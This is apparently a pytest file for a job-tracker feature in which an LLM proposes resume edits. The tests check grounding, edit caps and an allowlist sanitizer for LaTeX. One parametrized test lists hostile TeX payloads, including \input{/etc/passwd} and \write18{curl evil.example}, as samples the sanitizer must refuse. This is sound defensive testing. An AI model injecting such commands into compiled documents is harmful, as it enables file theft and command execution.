"""The `tailor` role: grounding, sanitizing, and what it refuses to write.

This is the first bounded role in this repo that composes prose, so the tests that matter
are the ones about what cannot get through it:

  * **Both anchors are verbatim.** `evidence` must occur in the job description and
    `current_line` in the resume. An edit that cannot name a real requirement or a real
    line is dropped — the `inbox` quote rule applied at both ends.
  * **The suggestion is sanitized.** A resume is compiled, so a suggestion is text about
    to be fed to a TeX engine. An allowlist of control sequences, not a blocklist.
  * **Nothing writes bytes to a resume.** The task proposes into its own table; applying
    an edit is a separate, deterministic pass, and it never touches the source document.
  * **Failure is absence.** A silent model, a malformed answer, or an answer whose edits
    all fail grounding all leave the posting exactly where it was.

No network, no router, no LaTeX toolchain. Stubs are hand-written, per house style.
"""

import json

import pytest

from jobtracker import store
from jobtracker.resume import Edit, get_format
from jobtracker.tasks import tailor

RESUME = r"""\documentclass{article}
\begin{document}
\section*{Experience}
\begin{itemize}
  \item Built a REST API in Flask for an internal analytics tool
  \item Wrote batch jobs that moved data between two Postgres databases
\end{itemize}
\end{document}
"""

DESCRIPTION = (
    "You will design and operate high-throughput HTTP services on a distributed "
    "platform. We use Python and Postgres, and care about observability."
)

LINE = r"  \item Built a REST API in Flask for an internal analytics tool"


@pytest.fixture(scope="module")
def latex():
    return get_format("latex")


def _answer(**over):
    edit = {
        "section": "experience",
        "current_line": LINE,
        "suggestion": LINE + " serving high-throughput HTTP traffic",
        "evidence": "high-throughput HTTP services",
    }
    edit.update(over)
    return json.dumps({"edits": [edit]})


# -- grounding -----------------------------------------------------------------------
def test_a_grounded_edit_survives(latex):
    """The happy path, so the refusals below are refusals and not a broken parser."""
    got = tailor.parse_edits(_answer(), RESUME, DESCRIPTION, latex)
    assert got is not None and len(got.edits) == 1
    assert got.edits[0].current_line == LINE


def test_an_invented_requirement_is_dropped(latex):
    """`evidence` must appear in the description, verbatim.

    This is the only thing standing between a tailored resume and a requirement the
    employer never stated — the rule `repair` applies to a slug that must appear on the
    page it was read from, and `inbox` to a quote that must appear in the email.
    """
    answer = _answer(evidence="ten years of Kubernetes experience")
    assert tailor.parse_edits(answer, RESUME, DESCRIPTION, latex) is None


def test_an_invented_resume_line_is_dropped(latex):
    """`current_line` must appear in the resume, verbatim.

    Without this the page can say "your resume says X" about something you never wrote,
    and `apply_edits` — which replaces exactly — would then silently change nothing.
    """
    answer = _answer(current_line=r"  \item Led a team of twelve engineers")
    assert tailor.parse_edits(answer, RESUME, DESCRIPTION, latex) is None


def test_a_line_that_only_matches_loosely_is_dropped(latex):
    """Grounding is checked whitespace-normalized, but `apply_edits` replaces exactly.

    An edit that passes the loose check and fails the exact one would render on the page
    and then do nothing when applied — a proposal that cannot be accepted, which is worse
    than one that was never made.
    """
    loose = LINE.replace("Built a", "Built  a")   # same words, doubled inner space
    answer = _answer(current_line=loose)
    assert tailor.parse_edits(answer, RESUME, DESCRIPTION, latex) is None


def test_a_section_outside_the_enum_is_dropped(latex):
    assert tailor.parse_edits(
        _answer(section="education"), RESUME, DESCRIPTION, latex
    ) is None


def test_a_suggestion_identical_to_the_line_is_dropped(latex):
    """An edit that changes nothing is noise on a page you are meant to read."""
    assert tailor.parse_edits(
        _answer(suggestion=LINE), RESUME, DESCRIPTION, latex
    ) is None


@pytest.mark.parametrize("text", ["", "not json at all", "[]", '{"edits": "lots"}'])
def test_a_malformed_answer_writes_nothing(text, latex):
    """Failure is absence, inherited whole from docs/llm.md."""
    assert tailor.parse_edits(text, RESUME, DESCRIPTION, latex) is None


def test_the_edit_cap_bounds_how_much_of_a_resume_one_posting_rewrites(latex):
    """Not a quality bound.

    A resume that moves twenty lines per posting is not a tailored resume, it is a
    different resume each time — and every one of those lines is a claim you have to
    stand behind in an interview.
    """
    edit = json.loads(_answer())["edits"][0]
    many = json.dumps({"edits": [edit] * (tailor.MAX_EDITS + 5)})
    got = tailor.parse_edits(many, RESUME, DESCRIPTION, latex)
    assert got is not None and len(got.edits) <= tailor.MAX_EDITS


# -- the LaTeX guard -----------------------------------------------------------------
@pytest.mark.parametrize("payload", [
    r"\input{/etc/passwd}",
    r"\write18{curl evil.example}",
    r"\openout1=/tmp/x",
    r"\catcode`\@=11",
    r"\csname inpu\endcsname t",
    r"\def\x{\x}\x",
])
def test_a_suggestion_that_would_run_something_is_refused(payload, latex):
    """A resume is compiled, so a suggestion is a program we are about to run.

    TeX reads files, writes files, redefines what characters mean, and under shell-escape
    runs commands. An allowlist rather than a blocklist because `\\csname` composes
    command names out of characters, so a blocklist is a guess and guessing wrong is quiet.
    """
    assert latex.sanitize(LINE + " " + payload) is None


def test_the_commands_a_resume_line_actually_needs_are_allowed(latex):
    assert latex.sanitize(r"\item Built \textbf{fast} APIs at 2\% error") is not None


def test_an_unbalanced_brace_is_refused(latex):
    """It executes nothing, but it moves where the group a line sits in ends — which
    silently reformats or swallows whatever follows."""
    assert latex.sanitize(r"\item Built \textbf{fast APIs") is None


def test_a_comment_character_is_refused(latex):
    """`%` comments out the rest of the physical line, including anything the original
    line carried after the part being replaced."""
    assert latex.sanitize(r"\item Built APIs % and hid the rest") is None


def test_a_refused_suggestion_takes_its_edit_with_it(latex):
    """The guard has to run inside parsing, not only at assembly time.

    An edit that renders on the page and is refused later is one you would accept and
    then watch do nothing.
    """
    answer = _answer(suggestion=LINE + r" \input{/etc/passwd}")
    assert tailor.parse_edits(answer, RESUME, DESCRIPTION, latex) is None


# -- applying ------------------------------------------------------------------------
def test_applying_an_edit_never_touches_the_preamble(latex):
    """`apply_edits` replaces a line it was given verbatim and does nothing else.

    It does not search, fuzzy-match or insert — which is what puts `\\documentclass` and
    the packages out of reach by construction, and therefore keeps a document that
    compiled before compiling after.
    """
    edits = [Edit("experience", LINE, LINE + " at scale", "high-throughput")]
    out, applied = latex.apply_edits(RESUME, edits)
    assert applied == 1
    assert out.startswith(r"\documentclass{article}")
    assert r"\begin{document}" in out and out.count(r"\section*{Experience}") == 1
    assert "at scale" in out


def test_an_edit_whose_line_has_gone_applies_nothing(latex):
    """The resume can change between proposing and applying. Nothing is forced in."""
    edits = [Edit("experience", "a line that is not there", "replacement", "e")]
    out, applied = latex.apply_edits(RESUME, edits)
    assert applied == 0 and out == RESUME


def test_nothing_in_the_tailor_path_writes_bytes_to_a_resume():
    """The rule the whole feature rests on, read off the source.

    `tailor` proposes into `resume_suggestions`; assembling writes a NEW file under
    TAILORED_DIR, and attaching one is a button you press. No path here may open the
    resume source for writing.
    """
    import pathlib

    from jobtracker import config

    source = (pathlib.Path(config.__file__).parent / "tasks" / "tailor.py").read_text()
    for forbidden in ("write_text", "write_bytes", "open(", "shutil", "os.replace"):
        assert forbidden not in source, forbidden


# -- the queue -----------------------------------------------------------------------
def test_a_unit_leaves_the_queue_once_its_suggestions_are_stored(tmp_path):
    """`run_task` recomputes `remaining` by re-reading `pending_count`, not by
    subtracting — so a task whose queue does not shrink after `apply` reports a backlog
    forever. `judge` gets this from `prose_hash`; this gets it from the resume hash."""
    conn = store.connect(":memory:")
    _seed_scored(conn)

    assert len(store.matches_needing_tailoring(conn, "hash-1")) == 1
    store.record_suggestions(conn, "Acme", "1", "[]", "hash-1", "2026-09-01")
    assert store.matches_needing_tailoring(conn, "hash-1") == []
    conn.close()


def test_a_new_resume_re_asks_every_posting(tmp_path):
    """The property the unit key exists for: edit the resume and every posting is a new
    question, with a clean retry count, because a failure answering the old one says
    nothing about the new."""
    conn = store.connect(":memory:")
    _seed_scored(conn)
    store.record_suggestions(conn, "Acme", "1", "[]", "hash-1", "2026-09-01")

    assert store.matches_needing_tailoring(conn, "hash-1") == []
    assert len(store.matches_needing_tailoring(conn, "hash-2")) == 1
    conn.close()


def test_an_unscored_match_is_not_pending(tmp_path):
    """`pending()` must only return work the task can actually do — and the point of
    scoring first is that `tailor` works the postings you will actually be shown."""
    conn = store.connect(":memory:")
    _seed_scored(conn, score=None)
    assert store.matches_needing_tailoring(conn, "hash-1") == []
    conn.close()


def test_a_posting_you_already_applied_to_is_not_pending(tmp_path):
    """A suggestion for a job that is behind you is work nobody will read."""
    conn = store.connect(":memory:")
    _seed_scored(conn)
    store.record_application(
        conn, "Acme", "1", "Backend Engineer", "applied", "2026-09-01"
    )
    assert store.matches_needing_tailoring(conn, "hash-1") == []
    conn.close()


def _seed_scored(conn, score=88.5):
    """One open, scored, described match — the shape `tailor.pending` looks for."""
    from jobtracker.models import Decision, Posting, Verdict

    posting = Posting(
        company="Acme", ats_job_id="1", title="Backend Engineer",
        location="NYC", url="https://example.com/1", posted_at=None,
        description=DESCRIPTION,
    )
    store.sync_postings(conn, "Acme", [posting], "2026-09-01")
    # `sync_postings` deliberately does not write descriptions — `check` caches them in
    # a separate pass — so a seed that skipped this would leave the column NULL and every
    # assertion below would pass for the wrong reason.
    store.set_description(conn, "Acme", "1", DESCRIPTION)
    store.record_verdict(
        conn,
        Verdict(company="Acme", ats_job_id="1", decision=Decision.MATCH,
                reason="on target"),
        "2026-09-01",
    )
    conn.execute(
        "INSERT INTO rankings (company, ats_job_id, backend_fit, growth, entry_risk, "
        "why, prose_hash, judged_at, score, scored_at) "
        "VALUES ('Acme','1','strong','strong','low','','p','2026-09-01',?,?)",
        (score, "2026-09-01" if score is not None else None),
    )
    conn.commit()
